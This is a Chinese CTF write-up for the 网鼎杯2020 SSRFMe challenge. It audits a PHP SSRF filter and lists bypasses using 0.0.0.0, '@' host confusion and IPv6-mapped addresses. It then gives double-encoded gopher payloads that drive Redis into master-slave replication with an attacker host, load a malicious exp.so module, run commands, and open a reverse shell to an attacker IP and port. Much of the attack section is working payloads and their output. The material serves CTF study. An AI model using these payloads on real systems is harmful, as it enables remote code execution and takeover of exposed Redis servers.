---
title: 网鼎杯2020玄武组-SSRFMe
date: 2025-06-02 15:15:01
tags:
- SSRF
- redis主从复制
- Gopher协议构造
category:
- 刷题笔记
---

# 网鼎杯2020玄武组-SSRFMe

参考博客：https://blog.csdn.net/qq_46143339/article/details/146221826

源码：

## 代码审计：

```
<?php
/**
 * 检查给定URL是否指向内网IP地址
 * @param string $url 待检查的URL
 * @return bool 如果是内网IP返回true，否则false
 */
function check_inner_ip($url)
{
    // 使用正则验证URL格式（允许http/https/gopher/dict协议）
    $match_result = preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/', $url);
    if (!$match_result) {
        die('url fomat error'); // 格式错误立即终止程序
    }
    
    try {
        // 解析URL获取各组成部分
        $url_parse = parse_url($url);
    } catch (Exception $e) {
        die('url fomat error'); // 异常处理（实际parse_url不会抛异常，此处逻辑存在问题）
        return false;
    }
    
    $hostname = $url_parse['host'];  // 提取主机名
    $ip = gethostbyname($hostname);  // DNS解析获取IP地址
    $int_ip = ip2long($ip);          // 将IP转为整数格式
    
    // 检查是否属于私有IP范围：可以尝试0.0.0.0绕过
    return ip2long('127.0.0.0') >> 24 == $int_ip >> 24 || // 127.0.0.0/8
           ip2long('10.0.0.0') >> 24 == $int_ip >> 24  || // 10.0.0.0/8
           ip2long('172.16.0.0') >> 20 == $int_ip >> 20 || // 172.16.0.0/12
           ip2long('192.168.0.0') >> 16 == $int_ip >> 16;  // 192.168.0.0/16
}

/**
 * 安全请求URL（理论上应该阻止访问内网资源）
 * @param string $url 要请求的URL
 */
function safe_request_url($url)
{
    if (check_inner_ip($url)) {
        echo $url . ' is inner ip'; // 内网地址拦截提示
    } else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);       // 设置请求URL
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 返回响应结果
        curl_setopt($ch, CURLOPT_HEADER, 0);       // 不包含响应头
        
        $output = curl_exec($ch);                  // 执行请求
        $result_info = curl_getinfo($ch);          // 获取请求信息
        
        // 递归处理重定向（存在SSRF风险）
        if ($result_info['redirect_url']) {
            safe_request_url($result_info['redirect_url']);
        }
        
        curl_close($ch);
        var_dump($output); // 输出响应内容
    }
}

// 主程序逻辑
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    if (!empty($url)) {
        safe_request_url($url); // 处理用户输入的URL
    }
} else {
    highlight_file(__FILE__); // 无参数时显示源代码
}
// 提示本地访问hint.php（可能存在提示信息）

```

---

**内网IP检测逻辑：**
**check_inner_ip函数通过解析URL的host部分，将其转换为IP地址，并与内网IP段（127.0.0.0/8、10.0.0.0/8等）对比。若检测到内网IP，则拒绝请求。**
**SSRF触发点：**
**safe_request_url函数使用cURL发起请求，若存在重定向（如302跳转），会递归调用自身处理重定向后的URL。**
**详细代码审计见文章结尾。**

## 解题思路：

首先要绕过内网IP限制访问hint.php

绕过方法：利用`0.0.0.0`作为本地地址的别名特性，构造请求：?url=`http://0.0.0.0/hint.php`；或者使用`@`符号混淆：`?url=http://abc.com@0.0.0.0/hint.php`或者使用IPv6绕过限制：`?url=http://[0:0:0:0:0:ffff:127.0.0.1]//hint.php`

**hint.php内容：**

```
string(1342) " <?php
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
}
"
```

提示Redis密码为`root`，但是直接写入文件失败，因为权限不足。所以需向Redis攻击。

### 解法一 **Redis主从复制攻击**

攻击原理：
Redis 4.x~5.0.5支持主从复制，从机(靶机)可加载恶意模块（.so文件）实现RCE （Remote Code Execution，远程代码执行） 。需利用SSRF向Redis发送命令，使其连接至攻击者控制的“主服务器”并加载恶意模块。Payload需二次URL编码以确保传输正确。

**攻击步骤：**

**1、攻击开启主服务器**

需要利用到两个工具：Awsome-Redis-Rogue-Server 与redis-rogue-server 。先下载这两个工具，地址分别为：https://github.com/n0b0dyCN/redis-rogue-server和https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server。替换Awsome-Redis-Rogue-Server的模块为redis-rogue-server的exp.so（含system命令模块），启动恶意主节点并加载该模块执行命令。redis_rogue_server.py位于Awsome-Redis-Rogue-Server项目中，redis-rogue-server.py位于redis-rogue-server

```
python3 redis_rogue_server.py -v -path exp.so -lport 21000
```

**2、修改Redis持久化文件（如 RDB 快照）的存储目录：**

gopher协议具体介绍见文章[基础知识《Gopher协议》](https://blog.csdn.net/qq_46143339/article/details/146252194?sharetype=blogdetail&sharerId=146252194&sharerefer=PC&sharesource=qq_46143339&spm=1011.2480.3001.8118)。发送命令设置存储目录为`/tmp`（有写权限），编码后Payload： （`%0d`和`0x0a`分别代表**回车符（CR，ASCII 13）** 和 **换行符（LF，ASCII 10）** ，`%`编码之后是`%25`）

```
gopher://0.0.0.0:6379/_auth root  # 尝试使用密码 `root` 进行 Redis 认证
config set dir /tmp/  # 修改 Redis 持久化文件（如 RDB 快照）的存储目录为 `/tmp/`
quit  # 退出 Redis 连接

# 经过两次url编码
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
```

**3、设置主从复制关系，数据同步：**

指定恶意Redis服务器（如攻击者IP `174.1.185.67:21000`）为主节点，并设置持久化文件名为`exp.so`：

```
gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so  # 将 Redis 持久化文件（如 RDB 快照）的名称设置为 `exp.so`
slaveof 174.1.185.67 21000  # 将当前 Redis 实例设置为 IP `174.1.185.67` 端口 `21000` 的从节点，接受主节点的数据同步
quit

# 经过两次url编码
gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520174.1.185.67%252021000%250d%250aquit
```

**4、加载恶意模块**

```
gopher://0.0.0.0:6379/_auth root
module load /tmp/exp.so
quit

gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250aquit
```

**5、关闭主从同步**

```
gopher://0.0.0.0:6379/_auth root
slaveof NO ONE
quit

gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit
```

**6、导出数据库**：

```
gopher://0.0.0.0:6379/_auth root
config set dbfilename dump.rdb
quit

gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit
```

**7、获取flag**

```
gopher://0.0.0.0:6379/_auth root
system.exec "cat /flag"
quit

gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit
```

---

### 解法二 反弹shell

```
# 攻击机监听 6666
nc -lvvp 6666
```

```
# 如攻击者IP `174.1.185.67:6666`
gopher://0.0.0.0:6379/_auth root
system.rev 174.1.185.67 6666
quit

gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.rev%2520174.1.185.67%25206666%250d%250aquit
```

```
dir  
exp.so pear  
dir /  
bin dev flag home lib64 mnt proc run srv sys usr  
boot etc flag.sh lib media opt root sbin start.sh tmp var  
cat /flag  
flag{dca2cded-fb98-4b9b-a92b-c040fc8c0c2f}
```

### **解法三：`redis-ssrf`**：

工具：[redis-ssrf](https://github.com/xmsec/redis-ssrf)以及上文提到的[redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)。`redis-ssrf`地址：`https://github.com/xmsec/redis-ssrf`。
过程：

1. 复制.so文件到redis-ssrf目录中；
2. 修改ssrf-redis.py文件：

```
# 需要修改三部分源代码：
# 第一部分源代码：
elif mode==3:
lhost="192.168.1.100"
lport="6666"
command="whoami"

# 修改代码一：
elif mode==3:
lhost="攻.击.机.ip"
lport="攻击机端口"  #  端口可以修改，但是要求与redis-rogue-server.py主函数中的lport一致
command="cat /flag"  # 要执行的命令

# 第二部分源代码：
ip="127.0.0.1"
port="6379"
payload=protocol+ip+":"+port+"/_"

# 修改代码二：
ip="0.0.0.0"
port="6379"
payload=protocol+ip+":"+port+"/_"

# 第三部分源代码：
# input auth passwd or leave blank for no pw
passwd = ''

# 修改代码三：
# input auth passwd or leave blank for no pw
passwd = 'root'
```

修改完成后运行产生

```
payload:gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2413%0D%0A192.168.1.100%0D%0A%244%0D%0A6666%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%245%0D%0A/tmp/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%246%0D%0Aexp.so%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%246%0D%0Awhoami%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
```

对payload再次进行url编码确保正常运行：

```
gopher%253A%252F%252F0.0.0.0%253A6379%252F_*2%250A%25244%250AAUTH%250A%25244%250Aroot%250A*3%250A%25247%250ASLAVEOF%250A%252413%250A192.168.1.100%250A%25244%250A6666%250A*4%250A%25246%250ACONFIG%250A%25243%250ASET%250A%25243%250Adir%250A%25245%250A%252Ftmp%252F%250A*4%250A%25246%250Aconfig%250A%25243%250Aset%250A%252410%250Adbfilename%250A%25246%250Aexp.so%250A*3%250A%25246%250AMODULE%250A%25244%250ALOAD%250A%252411%250A%252Ftmp%252Fexp.so%250A*2%250A%252411%250Asystem.exec%250A%25246%250Awhoami%250A*1%250A%25244%250Aquit
```

运行redis-rogue-server.py并注入payload：

```
?url=gopher%253A%252F%252F0.0.0.0%253A6379%252F_*2%250A%25244%250AAUTH%250A%25244%250Aroot%250A*3%250A%25247%250ASLAVEOF%250A%252413%250A192.168.1.100%250A%25244%250A6666%250A*4%250A%25246%250ACONFIG%250A%25243%250ASET%250A%25243%250Adir%250A%25245%250A%252Ftmp%252F%250A*4%250A%25246%250Aconfig%250A%25243%250Aset%250A%252410%250Adbfilename%250A%25246%250Aexp.so%250A*3%250A%25246%250AMODULE%250A%25244%250ALOAD%250A%252411%250A%252Ftmp%252Fexp.so%250A*2%250A%252411%250Asystem.exec%250A%25246%250Awhoami%250A*1%250A%25244%250Aquit
```

---

# 知识点

## **Redis主从复制攻击**

Redis主从复制攻击是指攻击者利用Redis主从架构的配置缺陷或漏洞，通过控制主节点或从节点实现未授权访问、数据泄露、远程代码执行（RCE）等恶意行为。以下是此类攻击的核心原理、常见手法及防御建议：

### 一、攻击原理

1. **主从复制的机制漏洞 Redis主从复制默认基于异步通信，主节点（Master）将数据同步给从节点（Slave）。若主节点存在未授权访问或弱密码，攻击者可伪造从节点（Slave）身份，强制主节点发送数据或执行恶意命令，例如加载恶意模块（如.so文件）实现代码执行。**
2. **未授权访问与横向移动 Redis默认监听6379端口且早期版本无密码认证。攻击者通过暴露的Redis实例建立主从关系，利用SLAVEOF命令将目标Redis设置为从节点，进而控制主节点发送恶意数据（如恶意Lua脚本或模块）。**

3. **缓冲区溢出与代码执行 Redis的Lua脚本引擎（如CVE-2024-31449、CVE-2024-46981）存在堆栈溢出漏洞，攻击者可通过主从复制传递特制Lua脚本触发漏洞，导致远程代码执行（RCE）。**

### 二、常见攻击手法

**恶意模块加载攻击**

**步骤：攻击者搭建恶意主节点，生成包含后门的.so文件（如利用RedisModules-ExecuteCommand工具），诱导目标Redis作为从节点连接。主节点通过MODULE LOAD命令强制从节点加载恶意模块，获得反弹Shell或执行系统命令 。**
**案例：工具redis-rce通过生成恶意.so文件结合主从复制实现RCE 。**
**数据覆写与权限提升**

**通过CONFIG SET dir和CONFIG SET dbfilename修改Redis持久化路径，将SSH公钥写入目标服务器的authorized_keys文件，获取SSH登录权限 。**
**Lua脚本漏洞利用**

**利用Lua脚本引擎的缓冲区溢出漏洞（如CVE-2024-31449），通过主从复制传递恶意脚本触发堆栈溢出，实现代码执行 。**

---

## **IPv6绕过**

1. 关键漏洞：未正确处理 IPv6 地址
函数的核心逻辑是提取 URL 的 host 并解析为 IPv4 地址，但未考虑 IPv6 地址的兼容性。
当 URL 使用 IPv4 映射的 IPv6 地址（如 [::ffff:127.0.0.1]）时：

- parse_url 会提取 host 为 0:0:0:0:0:ffff:127.0.0.1（IPv6 格式）。

- gethostbyname 无法正确解析此类地址，可能直接返回原字符串或无效值。
- ip2long 仅支持 IPv4，遇到非 IPv4 字符串会返回 false，导致后续逻辑失效。

### **步骤 1：正则表达式绕过**

URL `http://[0:0:0:0:0:ffff:127.0.0.1]//hint.php` 符合正则规则：

```
preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/', $url);
```

正则未严格校验主机名格式（如 IPv6 的方括号语法），导致绕过。

### **步骤 2：parse_url 解析结果**

`parse_url` 提取的 `host` 为 `0:0:0:0:0:ffff:127.0.0.1`（去除方括号后的 IPv6 地址）。

### **步骤 3：gethostbyname 解析失败**

gethostbyname 尝试解析 0:0:0:0:0:ffff:127.0.0.1：

- 该地址本质是 IPv4 映射的 IPv6 地址（对应 127.0.0.1），但 gethostbyname 默认只支持 IPv4，无法识别此格式。

- 返回结果为原字符串 0:0:0:0:0:ffff:127.0.0.1，而非预期的 127.0.0.1。

### **步骤 4：ip2long 转换失败**

```
$ip = '0:0:0:0:0:ffff:127.0.0.1'; // 非 IPv4 格式
$int_ip = ip2long($ip); // 返回 false
```

- `ip2long` 无法处理非 IPv4 地址，返回 `false`。
- `false` 转换为整数时为 `0`，后续比较逻辑完全失效：

```
// 所有条件均为 false
127.0.0.0 >>24 == 0 >>24  // 127 vs 0 → false
10.0.0.0 >>24 == 0 >>24   // 10 vs 0 → false
...
```

- 函数错误地返回 `false`（认为非内网 IP），但实际目标为 `127.0.0.1`（应被拦截）。

3. **根本原因**
**IPv6 盲区：函数仅针对 IPv4 设计，未处理 IPv6 地址（尤其是 IPv4 映射的 IPv6 地址）。**
**依赖脆弱函数：gethostbyname + ip2long 组合无法安全解析混合格式的 IP。**
**错误处理缺失：未校验 ip2long 的返回值是否为合法 IPv4。**

---

## **parse_url解析**

在 PHP 中，URL `http://abc.com@0.0.0.0/hint.php` 可以绕过 `check_inner_ip` 函数的内网 IP 检测，原因如下：

###### **URL 结构分析**

- URL 格式：

  ```
  http://user@host/path
  ```

  ，其中：

  - `user` 部分为 `abc.com`（用户名）。
  - `host` 部分为 `0.0.0.0`（实际目标主机）。
  - `path` 为 `/hint.php`。

  **`parse_url` 的解析结果**

  ```
  $url = 'http://abc.com@0.0.0.0/hint.php';
  $parts = parse_url($url);
  
  // 输出：
  [
    'scheme' => 'http',
    'host' => '0.0.0.0',  // 实际目标主机
    'user' => 'abc.com',   // 用户名部分
    'path' => '/hint.php'
  ]
  ```

  - **关键点**：
    `parse_url` 正确解析出 `host` 为 `0.0.0.0`，但 `0.0.0.0` 是一个特殊 IP，表示“所有本机网络接口”，通常**不被视为内网 IP**。

### 函数 check_inner_ip 的逻辑漏洞

函数通过以下步骤验证内网 IP：

- 提取 host（0.0.0.0）。
- 将 host 解析为 IP（gethostbyname('0.0.0.0')）。
- 检查该 IP 是否属于私有 IP 段（如 10.0.0.0/8, 192.168.0.0/16 等）。
- 漏洞 1：0.0.0.0 未被识别为内网 IP
- 0.0.0.0 是特殊 IP，表示“绑定到本机所有网络接口”，但不直接属于内网 IP 段（如 127.0.0.0/8 或 192.168.0.0/16）。
- 函数中的条件检查未覆盖 0.0.0.0，导致其被错误放行。
- 漏洞 2：gethostbyname 的行为
- gethostbyname('0.0.0.0') 的返回值取决于系统环境：
- 在某些系统中，0.0.0.0 会被解析为本机 IP（如 127.0.0.1）。
- 在另一些系统中，直接返回 0.0.0.0。
- 若返回 0.0.0.0，则 ip2long('0.0.0.0') 的值为 0，而函数检查条件中未覆盖该值。

假设 `gethostbyname('0.0.0.0')` 返回 `0.0.0.0`：

```
$ip = '0.0.0.0';
$int_ip = ip2long($ip); // 结果为 0

// 检查条件：
127.0.0.0 >>24 == 0 >>24    → 127 vs 0 → false
10.0.0.0 >>24 == 0 >>24     → 10 vs 0 → false
172.16.0.0 >>20 == 0 >>20   → 172.16 vs 0 → false
192.168.0.0 >>16 == 0 >>16  → 192.168 vs 0 → false

// 函数返回 false（认为非内网 IP），实际请求会发送到 0.0.0.0。
```



